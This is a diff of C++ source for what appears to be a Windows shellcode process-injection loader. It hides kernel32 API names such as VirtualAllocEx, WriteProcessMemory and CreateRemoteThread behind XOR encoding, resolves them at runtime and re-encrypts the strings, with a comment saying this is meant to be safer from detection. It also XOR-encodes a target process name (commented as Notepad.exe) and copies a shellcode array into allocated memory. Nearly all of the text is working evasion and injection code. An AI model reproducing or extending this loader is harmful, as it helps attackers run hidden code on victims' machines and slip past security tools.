@@ -66,14 +66,14 @@ unsigned char Process32First[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55
 unsigned char CreateToolhelp32SnapshotStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x35, 0x9, 0x2b, 0x3c, 0x10, 0x21, 0x2, 0x36, 0x47, 0x76, 0x0, 0x6, 0xb, 0x26, 0x38, 0x2c, 0x1f, 0x15 };
 unsigned char Process32Next[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x1e, 0x1d, 0x3c, 0x1a };
 unsigned char CreateRemoteThreadStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x33, 0x3, 0x29, 0x3f, 0xc, 0x21, 0x3a, 0x2e, 0x6, 0x21, 0x32, 0xc};
-unsigned char targetProcess[] = { 0xd, 0x1, 0x12, 0x2f, 0x5, 0x28, 0x5, 0x48, 0x21, 0x28, 0x1d }; //Notepad.exe XOR'd
+unsigned char targetProcess[] = { 0x2d, 0x1, 0x12, 0x2f, 0x5, 0x28, 0x5, 0x9, 0x26, 0x36, 0x1a }; //Notepad.exe XOR'd
 unsigned char virtualAllocEx[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27, 0x2b, 0x3e }; 
 unsigned char writeProcessMemoryStr[] = { 0x14, 0x1c, 0xf, 0x3e, 0x10, 0x19, 0x13, 0x9, 0x27, 0x35, 0xb, 0x37, 0x23, 0x23, 0x19, 0x2b, 0x21, 0x11 };
 unsigned char openProcessStr[] = { 0xc, 0x1e, 0x3, 0x24, 0x25, 0x3b, 0xe, 0x5, 0x21, 0x23, 0xb };
 unsigned char virtualProtectExStr[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32, 0x31, 0x3c };
 
 unsigned int targetProcessId; //Not XOR'd as its only a predec for a runtime variable.
-//WCHAR target[] = "Notepad.exe";
+
 /*
 I literally have no clue why but I cannot for the life of me get, GetProcAddress to work with the param CreateToolHelp32Snapshot, unless I provide it as a literal.
 I tried doing char[], Nope.
@@ -217,17 +217,13 @@ unsigned char* XOREncryptLPC(unsigned char* encoded, int sizeOfEncodedStr, char 
 
 }
 
-
-
-//3) Base64 Encode
-
-//4) Base64 Decode
-
 template <typename pointerToFunc> pointerToFunc createFunction(unsigned char* parentModule,int parentModule_Length ,unsigned char* inputArray, int inputArray_Length, char* XORKey, int XORKey_Length)
 {
 	pointerToFunc pFunction  = (pointerToFunc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(parentModule, parentModule_Length, XORKey, XORKey_Length)), (LPCSTR)XORDecryptLPC(inputArray, inputArray_Length, XORKey, XORKey_Length));
-	XOREncryptLPC(parentModule, parentModule_Length, XORKey, XORKey_Length);
-	XOREncryptLPC(inputArray, inputArray_Length, XORKey, XORKey_Length);
+	
+	XOREncryptLPC(parentModule, parentModule_Length, XORKey, XORKey_Length); //XOR the parent module array, to be potentially safer from detection.
+	
+	XOREncryptLPC(inputArray, inputArray_Length, XORKey, XORKey_Length); //Do the same with the input array
 
 	if (pFunction == NULL)
 	{
@@ -247,124 +243,52 @@ int main()
 //	freeconsole();
 	bool isAllocated;
 	bool isExec;
-	//LPVOID pVirtualAlloc;
 	void* memoryBuffer;
-	functVirtualProtect pVirtualProtect;
-	functVirtualAlloc pVirtualAlloc;
-	functRtlMoveMemory pRtlMoveMemory;
-	functProcess32First pProcess32First;
-	functCreateToolHelp32Snapshot pCreateToolHelp32Snapshot;
-	functProcess32Next pProcess32Next;
-	functCreateRemoteThread pCreateRemoteThread;
-	functVirtualAllocEx pVirtualAllocEx;
-	functWriteProcessMemory pWriteProcessMemory;
-	functOpenProcess pOpenProcess;
-	functVirtualProtectEx pVirtualprotectEx;
 	HANDLE targetProc{};
 	LPVOID remMemoryBuffer =NULL;
 	DWORD oldProtectValue;
 
+	functOpenProcess pOpenProcess = createFunction<functOpenProcess>(kernel, sizeof(kernel), openProcessStr, sizeof(openProcessStr), XORKey, XORKey_length);
 
-	//Initializing function pointer values
-	/* Commented out for testing 8th jan for template
-		pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
-	if (pVirtualAlloc == NULL)
-	{
-		printf("pVirtualAlloc is null ptr!");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length); //reencrypt virAlloc string after our handle has been grabbed
+	functVirtualAlloc pVirtualAlloc = createFunction<functVirtualAlloc>(kernel, sizeof(kernel), virAlloc, sizeof(virAlloc), XORKey, XORKey_length);
+
+	functVirtualProtect pVirtualProtect = createFunction<functVirtualProtect>(kernel, sizeof(kernel), virProtec, sizeof(virProtec), XORKey, XORKey_length);
+	
+	functRtlMoveMemory pRtlMoveMemory = createFunction<functRtlMoveMemory>(kernel, sizeof(kernel), rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length);
+
+	functProcess32First pProcess32First = createFunction<functProcess32First>(kernel, sizeof(kernel), Process32First, sizeof(Process32First), XORKey, XORKey_length);
+	
+	functVirtualAllocEx pVirtualAllocEx = createFunction<functVirtualAllocEx>(kernel, sizeof(kernel), virtualAllocEx, sizeof(virtualAllocEx), XORKey, XORKey_length);
+
+	functProcess32Next pProcess32Next = createFunction<functProcess32Next>(kernel, sizeof(kernel), Process32Next, sizeof(Process32Next), XORKey, XORKey_length);
+
+	functWriteProcessMemory pWriteProcessMemory = createFunction<functWriteProcessMemory>(kernel, sizeof(kernel), writeProcessMemoryStr, sizeof(writeProcessMemoryStr), XORKey, XORKey_length);
+	
+	functCreateRemoteThread pCreateRemoteThread = createFunction<functCreateRemoteThread>(kernel, sizeof(kernel), CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length);
+
+
+
+	/*READ ME!!!
+
+	The two functions below require string literals, and cannot seem to work with GetProcAddress when provided as arrays... I have to figure this one out!
 	*/
-	pVirtualAlloc = createFunction<functVirtualAlloc>(kernel, sizeof(kernel), virAlloc, sizeof(virAlloc), XORKey, XORKey_length);
-
-	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length)); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
-	if (pVirtualProtect == NULL)
-	{
-		printf("pVirtualProtect is null ptr!");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length);//reencrypt virProtec string after our handle has been grabbed 
-
-	pRtlMoveMemory = (functRtlMoveMemory)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length));
-	if (pRtlMoveMemory == NULL)
-	{
-		printf("pRtlMoveMemory is null ptr!");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length);//reencrypt RtlMoveMem string after our handle has been grabbed 
-
-
-	pProcess32First = (functProcess32First)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length));
-	if (pProcess32First == NULL)
-	{
-		printf("pProcess32First is null ptr!");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length);//reencrypt Process32First string after our handle has been grabbed 
-
-
-
-	pCreateToolHelp32Snapshot = (functCreateToolHelp32Snapshot)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), "CreateToolhelp32Snapshot");
+	functCreateToolHelp32Snapshot pCreateToolHelp32Snapshot = (functCreateToolHelp32Snapshot)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), "CreateToolhelp32Snapshot");
 	if (pCreateToolHelp32Snapshot == NULL)
 	{
 		printf("pCreateToolHelp32Snapshot is null ptr!");
 	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); 
+	XOREncryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length);
 
 	
-
-
-	pProcess32Next = (functProcess32Next)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length));
-	if (pProcess32Next == NULL)
-	{
-		printf("pProcess32Next is null ptr!");
-
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
-
-	pCreateRemoteThread = (functCreateRemoteThread)(GetProcAddress(GetModuleHandle((LPCSTR)(XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length))), (LPCSTR)(XORDecryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length))));
-	if (pCreateRemoteThread == NULL)
-	{
-		printf("pCreateRemoteThread IS NULL ptr! \n");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
-
-	pVirtualAllocEx = (functVirtualAllocEx)(GetProcAddress(GetModuleHandle((LPCSTR)(XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length))), (LPCSTR)(XORDecryptLPC(virtualAllocEx, sizeof(virtualAllocEx), XORKey, XORKey_length))));
-	if (pVirtualAllocEx == NULL)
-	{
-		printf("pVirtualAllocEx is null ptr \n");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(virtualAllocEx, sizeof(virtualAllocEx), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
-
-	pWriteProcessMemory = (functWriteProcessMemory)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)(XORDecryptLPC(writeProcessMemoryStr, sizeof(writeProcessMemoryStr), XORKey, XORKey_length)));
-	if (pWriteProcessMemory == NULL)
-	{
-		printf("pWriteProcessMemory IS NULL PTR \n");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(writeProcessMemoryStr, sizeof(writeProcessMemoryStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
-
-	pOpenProcess = (functOpenProcess)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)(XORDecryptLPC(openProcessStr, sizeof(openProcessStr), XORKey, XORKey_length)));
-	if (pOpenProcess == NULL)
-	{
-		printf("pOpenProcess IS NULL PTR \n");
-	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(openProcessStr, sizeof(openProcessStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
-
-
-//	pVirtualprotectEx = (functVirtualProtectEx)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), ((LPCSTR)(XORDecryptLPC(virtualProtectExStr, sizeof(virtualProtectExStr), XORKey, XORKey_length))));
-	pVirtualprotectEx = (functVirtualProtectEx)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)"VirtualProtectEx");
+	functVirtualProtectEx pVirtualprotectEx = (functVirtualProtectEx)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)"VirtualProtectEx");
 	if (pVirtualprotectEx == NULL)
 	{
 		printf("virtualProtectEx IS NULL PTR \n");
 	}
-	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
-	XOREncryptLPC(virtualProtectExStr, sizeof(virtualProtectExStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length);  
+	XOREncryptLPC(virtualProtectExStr, sizeof(virtualProtectExStr), XORKey, XORKey_length);
+
 
 
 
@@ -372,7 +296,8 @@ int main()
 
 
 
-	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //Create local buffer 
+	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //Create local memory buffer 
+
 	printf("pointer to mem: %p \n", memoryBuffer); //Quality of life print, for debugging.
 	pRtlMoveMemory(memoryBuffer, shellcode, shellcode_length); //Copy the shellcode uchar array into the local buffer. 
 
